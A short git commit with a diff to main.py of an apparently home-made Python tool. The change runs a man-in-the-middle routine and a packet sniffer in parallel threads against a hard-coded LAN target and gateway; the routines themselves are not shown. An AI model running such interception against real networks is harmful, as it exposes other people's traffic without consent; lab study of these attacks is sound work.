2e0e2c6eb02ecbc8231a477443a96277e85564dd
grm-applications <georgemoore2801@outlook.com>
2022-10-04 10:58:48 +0100

    make use of multi-threading to execute man-in-the-middle and sniff for packets simultaneously

--- main.py
+++ main.py
@@ -1,7 +1,13 @@
 
+from modules.sniff_packets import *
 from modules.man_in_the_middle import *
+import threading
 
 gateway_ip_addr = "192.168.0.1"
 target_ip_addr = "192.168.0.13" 
 
-man_in_the_middle(target_ip_addr, gateway_ip_addr)
+sniff = threading.Thread(target=sniff_packets, args=("en0", "host 192.168.0.13"))
+mitm = threading.Thread(target=man_in_the_middle, args=(target_ip_addr, gateway_ip_addr))
+
+sniff.start()
+mitm.start()
